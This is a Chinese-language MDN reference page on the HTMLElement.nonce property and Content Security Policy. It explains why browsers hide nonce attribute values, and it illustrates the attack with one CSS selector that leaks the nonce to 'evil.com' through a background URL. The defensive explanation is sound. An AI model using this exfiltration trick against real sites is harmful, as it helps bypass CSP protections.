---
title: HTMLElement.nonce
slug: Web/API/HTMLElement/nonce
---

{{APIRef("HTML DOM")}}

{{domxref("HTMLElement")}} 接口的 **`nonce`** 属性返回只使用一次的加密数字，被内容安全政策用来决定这次请求是否被允许处理。

在接下来的实现中，有 nonce 属性的元素只能在脚本中使用（不可以在其他渠道使用，比如 css 属性选择器）。

## 示例

### 访问 nonce 属性值

以前，并不是所有的浏览器都支持 `nonce` IDL 属性，因此在实际应用场景中，尝试使用 [`getAttribute`](/zh-CN/docs/Web/API/Element/getAttribute) 作为备选：

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

然而，最新的浏览器版本都隐藏了 `nonce` 值（返回一个空值）。IDL 属性（`script['nonce']`）成为唯一的访问方式。

隐藏 Nonce 是为了阻止攻击者通过某种机制提取出 nonce 值，比如下面这种方式：

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## 规范

{{Specifications}}

## 浏览器兼容性

{{Compat}}
